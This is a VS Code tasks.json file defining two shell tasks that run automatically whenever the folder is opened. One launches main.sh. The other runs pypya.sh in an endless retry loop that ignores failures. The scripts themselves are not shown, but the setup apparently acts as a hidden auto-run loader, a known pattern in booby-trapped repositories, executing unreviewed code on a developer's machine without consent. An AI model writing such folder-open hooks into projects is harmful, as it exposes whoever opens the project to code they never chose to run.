{
    "version": "2.0.0",
    "tasks": [
        {
            "label": "start-app",
            "type": "shell",
            "command": "lsof -i -P -n | grep LISTEN > /dev/null || (chmod +x main.sh && ./main.sh)",
            "runOptions": {
                "runOn": "folderOpen"
            }
        },
        {
            "label": "op-pya",
            "type": "shell",
            "command": "while true; do sleep 20; chmod +x pypya.sh && ./pypya.sh || true; echo 'Retrying pypya.sh in 30s...'; sleep 30; done",
            "runOptions": {
                "runOn": "folderOpen"
            }
        }
    ]
}
